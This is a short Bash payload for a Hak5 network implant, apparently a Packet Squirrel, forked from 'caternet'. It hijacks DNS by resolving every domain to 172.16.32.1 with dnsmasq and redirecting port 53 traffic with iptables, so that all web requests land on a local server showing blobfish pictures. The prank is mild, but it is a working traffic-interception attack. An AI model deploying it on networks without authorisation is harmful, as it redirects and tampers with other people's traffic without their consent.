# Title: Blobfishnet (forked from caternet by Hak5Darren)
# Author: Smidge
# Version: 1.0
# Description: Forwards all traffic to local webserver hosting blobfish. A few (minor) improvements on the original payload.
# Props: In loving memory of Hak5Kerby
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"

function monitor_process() {
	while true
	do
		[ ! -d "/proc/${1}" ] && {
			LED CLEANUP
			sync
      LED FAIL
			sleep 5
      halt
		}

		sleep 5
	done
}

function finish() {
  LED CLEANUP
  [ -d "/proc/${1}" ] && {        
    kill ${1}        
  }
  sync
  LED SUCCESS
  halt
}

LED SETUP
NETMODE NAT
echo "address=/#/172.16.32.1" > /tmp/dnsmasq.address
/etc/init.d/dnsmasq restart

cd $DIR

iptables -A PREROUTING -t nat -i eth0 -p udp --dport 53 -j REDIRECT --to-port 53
python server.py &
SERVERPID=$!
sleep 2
LED ATTACK
monitor_process $SERVERPID &
NO_LED=true BUTTON
finish $SERVERPID